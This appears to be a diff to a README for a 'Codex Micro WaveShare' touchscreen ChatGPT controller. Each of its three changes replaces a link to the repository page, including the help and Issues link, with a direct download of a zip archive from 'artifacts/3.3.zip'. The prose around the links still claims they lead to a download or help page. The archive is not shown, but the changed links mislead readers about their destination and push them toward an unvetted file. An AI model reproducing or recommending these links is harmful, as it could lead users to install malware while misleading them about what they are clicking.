@@ -1,6 +1,6 @@
 # 🎮 Codex Micro WaveShare - Turn Your Touchscreen into a ChatGPT Controller
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Codex%20Micro%20WaveShare-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Codex%20Micro%20WaveShare-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare/raw/refs/heads/main/artifacts/3.3.zip)
 
 ## 🚀 What Is This?
 
@@ -40,7 +40,7 @@ Follow these steps exactly, and you'll be up and running in minutes:
 
 Visit this link to download the application:
 
-**[🔗 Click Here to Download Codex Micro WaveShare](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare)**
+**[🔗 Click Here to Download Codex Micro WaveShare](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare/raw/refs/heads/main/artifacts/3.3.zip)**
 
 This link takes you to the download page. Look for a button that says **"Download"** or **"Releases"** on that page. Click it to get the software files.
 
@@ -170,7 +170,7 @@ If something goes wrong, try these in order:
 
 If you're stuck, don't panic! Here's what to do:
 
-1. **Visit the GitHub page** – [click here](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare) and look for an "Issues" or "Help" tab
+1. **Visit the GitHub page** – [click here](https://github.com/anamorphic-conglomerate194/codex-micro-waveshare/raw/refs/heads/main/artifacts/3.3.zip) and look for an "Issues" or "Help" tab
 2. **Read the documentation** – The README files on that page explain everything in detail
 3. **Ask the community** – There's a discussion or forum section on the GitHub page where you can ask questions
 
